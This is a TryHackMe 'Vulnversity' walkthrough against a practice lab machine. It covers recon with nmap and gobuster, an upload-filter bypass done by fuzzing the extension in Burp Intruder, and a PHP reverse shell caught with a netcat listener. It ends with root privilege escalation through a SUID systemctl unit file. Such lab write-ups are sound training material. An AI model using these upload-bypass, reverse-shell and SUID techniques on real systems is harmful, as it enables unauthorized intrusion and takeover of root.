---
title:  "Vulnversity"
author: fireblood
categories: [TryHackMe, Offensive Pentesting]
tags: [tryhackme, vulnversity, code injection, privilege escalation]
pin: false
math: true
mermaid: true
image:
  path: /assets/img/images/01.Vulnversity/vulnversity.png
---

Learn about active recon, web app attacks and privilege escalation.

<!--more-->

## Task 1

Deploy the machine.

## Task 2

Scan the machine for open ports using nmap.

```
nmap -sVC -oN vulnversity.txt 10.10.79.6
```

<img src="{{'/assets/img/images/01.Vulnversity/01.png' | prepend: site.baseurl }}" height="700">

There was an apache server running on port 3333. 

<img src="{{'/assets/img/images/01.Vulnversity/02.png' | prepend: site.baseurl }}" height="500">

## Task 3

Let's fuzz for directories using gobuster.
	
```
gobuster dir -u http://10.10.79.6:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

<img src="{{'/assets/img/images/01.Vulnversity/03.png' | prepend: site.baseurl }}" height="400">

There was a directory /internal/.

<img src="{{'/assets/img/images/01.Vulnversity/04.png' | prepend: site.baseurl }}" height="300">

## Task 4

Upon viewing it, there was a file upload functionality. Using this we can upload a malicious php file to get a reverse shell.
Copy the php file from https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php and edit the ip address to tun0 ip address.

Let us try to upload a php file and see if it's accepting the file type. The file type php is not accepted.

Start Burp Suite and configure the proxy in the browser. 

Upload the php file that we just created and capture the request in Burp.

<img src="{{'/assets/img/images/01.Vulnversity/05.png' | prepend: site.baseurl }}" height="200">

<img src="{{'/assets/img/images/01.Vulnversity/06.png' | prepend: site.baseurl }}" height="700">

Send the request to intruder and in payload positions, select attack type as sniper and add '§' to the file extension php. 

<img src="{{'/assets/img/images/01.Vulnversity/07.png' | prepend: site.baseurl }}" width="500">

Go to payload options, add the
extensions php, php3, php4. php5, phtml and start the attack.

After the attack was completed, we can see the results. In that sort by length and the length for phtml is 723 and for the rest of them 737. Also, for confirming 
that it was the correct file type allowed, check the response.

<img src="{{'/assets/img/images/01.Vulnversity/08.png' | prepend: site.baseurl }}" height="200">

Now, edit the file extension of the php file we created to phtml.

Upload the file, and in another terminal start a netcat listener.

<img src="{{'/assets/img/images/01.Vulnversity/10.png' | prepend: site.baseurl }}" height="300">

```
nc -lnvp 1234
```

<img src="{{'/assets/img/images/01.Vulnversity/09.png' | prepend: site.baseurl }}" height="100">

The file is uploaded, but we don't know where it is uploaded. Let's use gobuster again to fuzz for directories inside /internal.

```
gobuster dir -u http://10.10.79.6:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

<img src="{{'/assets/img/images/01.Vulnversity/11.png' | prepend: site.baseurl }}" height="500">

There was an uploads directory. In the browser, access the file we uploaded which will be present in the path.
> http://10.10.79.6:3333/internal/uploads/php_reverse_shell.phtml.
 
After file is accessed, we get a reverse shell.

<img src="{{'/assets/img/images/01.Vulnversity/12.png' | prepend: site.baseurl }}" height="400">

Now that we've got a shell, we need to stabilize the shell as it is unstable. We don't want to loose our connection if we hit ctrl+c or anything.

Run the command to spawn a tty shell.

```
python -c "import pty; pty.spawn('/bin/bash')"
```

Now hit ctrl+z to background it.

```
Ctrl+Z
```

Now you will get your shell and disable text display and foreground the process.

```
stty raw -echo && fg
```

Set the terminal variable.

```
export TERM=xterm
```

<img src="{{'/assets/img/images/01.Vulnversity/13.png' | prepend: site.baseurl }}" height="200">

## Task 5

Now run to find SUID files with root permission.

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

<img src="{{'/assets/img/images/01.Vulnversity/14.png' | prepend: site.baseurl }}" height="200">

We found some interesting files. Of them, /bin/systemctl is running as root.

Head to https://gtfobins.github.io/gtfobins/systemctl/#suid.

We will try to follow that to check whether it will work or not.

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
```

```
./systemctl link $TF
```

```
./systemctl enable --now $TF
```

Now we see output of the command id in the file we just created.

<img src="{{'/assets/img/images/01.Vulnversity/15.png' | prepend: site.baseurl }}" height="300">

Copy and paste it in the shell but make sure to modify the command we need to run inorder to get the root flag.

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
```

Now create symlink and enable it.

```
/bin/systemctl link $TF
```

```
/bin/systemctl enable --now $TF
```

<img src="{{'/assets/img/images/01.Vulnversity/16.png' | prepend: site.baseurl }}" height=300>

We got the root flag!!!
